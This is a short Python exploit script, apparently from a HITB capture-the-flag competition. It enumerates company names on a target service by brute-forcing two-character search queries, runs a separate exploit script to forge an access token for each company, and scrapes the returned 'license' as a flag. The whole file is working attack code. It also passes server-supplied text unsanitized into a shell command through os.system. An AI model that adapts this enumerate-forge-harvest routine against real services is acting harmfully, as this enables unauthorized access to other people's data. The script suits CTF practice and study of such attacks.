#!/usr/bin/env python3
import requests,sys,string,random,re,logging,os
import socket
sess = requests.Session()
ip = "godeeper.team1.ctf.hitb.org"
if ip == "localhost":
    port = 5555
    url = f"http://{ip}:{port}/"
else:
    url = f"https://{ip}/"

def hack(company):
    os.system("python3 t/sploit2.py %s > out.txt" % company)
    token = open("out.txt").read()
    token=token.strip()
    print("TOKEN IS",token)

    res = sess.get(url+"get_token?token="+token)
    res2 = re.findall(r"Your license is (\w+)",res.text)
    print("FLAG IS",res2[0])



for c1 in string.ascii_uppercase + string.digits:
    for c2 in string.ascii_uppercase + string.digits:
        res = sess.get(url+"search?pattern="+c1+c2)
        # print(res.text)
        res2 = re.findall(r'<td>(.+?)</td>',res.text)
        if len(res2)>0:
            hack(res2[0])

# company = sys.argv[1]
# os.system("python3 t/sploit2.py %s > out.txt" % company)
# token = open("out.txt").read()
# token=token.strip()
# print("TOKEN IS",token)
#
# res = sess.get(url+"get_token?token="+token)
# res2 = re.findall(r"Your license is (\w+)",res.text)
# print("FLAG IS",res2[0])
